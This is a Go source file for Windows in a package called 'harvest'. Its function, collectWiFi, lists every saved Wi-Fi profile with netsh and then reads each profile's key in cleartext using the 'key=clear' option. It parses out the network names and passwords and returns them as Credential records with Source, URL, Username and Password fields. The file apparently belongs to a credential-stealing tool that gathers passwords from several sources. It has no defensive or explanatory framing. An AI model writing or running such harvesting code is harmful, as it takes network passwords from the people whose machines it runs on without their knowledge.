//go:build windows
// +build windows

package harvest

import (
	"bytes"
	"os/exec"
	"regexp"
	"strings"
)

var (
	reProfileName = regexp.MustCompile(`All User Profile\s*:\s*(.+)`)
	reSSID        = regexp.MustCompile(`SSID\s*:\s*(.+)`)
	rePassword    = regexp.MustCompile(`Key Content\s*:\s*(.+)`)
)

func collectWiFi() []Credential {
	// List all Wi-Fi profiles
	out, err := exec.Command("netsh", "wlan", "show", "profiles").Output()
	if err != nil {
		return nil
	}

	var profiles []string
	for _, line := range strings.Split(string(out), "\n") {
		m := reProfileName.FindStringSubmatch(line)
		if len(m) == 2 {
			profiles = append(profiles, strings.TrimSpace(m[1]))
		}
	}

	var creds []Credential
	for _, profile := range profiles {
		detail, err := exec.Command("netsh", "wlan", "show", "profile",
			"name="+profile, "key=clear").Output()
		if err != nil {
			continue
		}

		ssid := profile
		pass := ""

		for _, line := range bytes.Split(detail, []byte("\n")) {
			if m := reSSID.FindSubmatch(line); len(m) == 2 {
				ssid = strings.TrimSpace(string(m[1]))
			}
			if m := rePassword.FindSubmatch(line); len(m) == 2 {
				pass = strings.TrimSpace(string(m[1]))
			}
		}

		if pass != "" {
			creds = append(creds, Credential{
				Source:   "wifi",
				URL:      ssid,
				Username: "",
				Password: pass,
			})
		}
	}
	return creds
}
